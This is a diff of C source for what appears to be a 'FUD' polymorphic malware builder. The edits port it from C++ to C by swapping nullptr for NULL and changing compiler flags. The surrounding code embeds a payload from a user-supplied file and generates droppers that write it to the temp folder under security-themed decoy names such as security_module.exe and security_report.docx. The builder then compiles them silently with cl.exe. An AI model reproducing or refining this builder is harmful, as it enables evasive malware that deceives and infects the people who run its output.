@@ -15,9 +15,6 @@
 #include <string.h>
 #include <time.h>
 #include <process.h>
-#include <iostream>
-#include <fstream>
-#include <sstream>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -73,10 +70,10 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     char compileCmd[2048];
     int result = -1;
     
-    // Method 1: Visual Studio 2022 (Primary) - Enhanced for larger executables
+    // Method 1: Visual Studio 2022 (Primary) - Enhanced for larger executables (Pure C compilation)
     sprintf_s(compileCmd, sizeof(compileCmd),
         "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-        "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
+        "/nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
         "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
         "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
         sourceFile, outputFile);
@@ -86,7 +83,7 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
         // Method 2: VS2022 Enterprise
         sprintf_s(compileCmd, sizeof(compileCmd),
             "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-            "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
+            "/nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
             "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
             "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
             sourceFile, outputFile);
@@ -97,7 +94,7 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
         // Method 3: VS2022 Professional
         sprintf_s(compileCmd, sizeof(compileCmd),
             "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-            "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
+            "/nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
             "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
             "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
             sourceFile, outputFile);
@@ -107,7 +104,7 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
     if (result != 0) {
         // Method 4: Generic VS2022 cl.exe in PATH
         sprintf_s(compileCmd, sizeof(compileCmd),
-            "cl.exe /nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
+            "cl.exe /nologo /O1 /MT /TC /bigobj \"%s\" /Fe:\"%s\" "
             "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
             "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
             sourceFile, outputFile);
@@ -129,11 +126,11 @@ int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
 // Advanced polymorphic source generator with payload embedding (VS2022 compatible)
 void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType, const char* inputFilePath) {
     // Read and prepare payload from input file
-    char* payloadData = nullptr;
+    char* payloadData = NULL;
     size_t payloadSize = 0;
     
     if (inputFilePath && strlen(inputFilePath) > 0) {
-        FILE* inputFile = nullptr;
+        FILE* inputFile = NULL;
         fopen_s(&inputFile, inputFilePath, "rb");
         if (inputFile) {
             fseek(inputFile, 0, SEEK_END);
@@ -270,7 +267,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_validation.html\");\n"
-                "    FILE* html_file = nullptr;\n"
+                "    FILE* html_file = NULL;\n"
                 "    fopen_s(&html_file, temp_path, \"w\");\n"
                 "    if (html_file) {\n"
                 "        fputs(html_content, html_file);\n"
@@ -297,7 +294,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_report.docx\");\n"
-                "    FILE* docx_file = nullptr;\n"
+                "    FILE* docx_file = NULL;\n"
                 "    fopen_s(&docx_file, temp_path, \"wb\");\n"
                 "    if (docx_file) {\n"
                 "        fwrite(docx_header, 1, 8, docx_file);\n"
@@ -323,7 +320,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_addon.xll\");\n"
-                "    FILE* xll_file = nullptr;\n"
+                "    FILE* xll_file = NULL;\n"
                 "    fopen_s(&xll_file, temp_path, \"w\");\n"
                 "    if (xll_file) {\n"
                 "        fputs(xll_data, xll_file);\n"
@@ -348,7 +345,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_module.exe\");\n"
-                "    FILE* pe_file = nullptr;\n"
+                "    FILE* pe_file = NULL;\n"
                 "    fopen_s(&pe_file, temp_path, \"wb\");\n"
                 "    if (pe_file) {\n"
                 "        fwrite(pe_header, 1, 8, pe_file);\n"
@@ -370,7 +367,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "    sprintf_s(temp_file, MAX_PATH, \"%s\\\\enterprise_payload_%lu.exe\", temp_path, GetTickCount());\n"
                     "    \n"
                     "    // Write actual payload data to file (only the real payload, not padding)\n"
-                    "    FILE* payload_file = nullptr;\n"
+                    "    FILE* payload_file = NULL;\n"
                     "    fopen_s(&payload_file, temp_file, \"wb\");\n"
                     "    if (payload_file) {\n"
                     "        fwrite(embedded_payload_data, 1, PAYLOAD_SIZE, payload_file);\n"
@@ -455,7 +452,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
     }
     
     // Generate embedded payload data as byte array with padding for larger executables
-    char* payloadByteArray = nullptr;
+    char* payloadByteArray = NULL;
     size_t actualPayloadSize = payloadSize;
     
     if (payloadData && payloadSize > 0) {
@@ -732,7 +729,7 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%d_%d.cpp", GetTickCount(), batch);
         
         // Write source file
-        FILE* file = nullptr;
+        FILE* file = NULL;
         fopen_s(&file, tempSource, "w");
         if (file) {
             fputs(sourceCode, file);
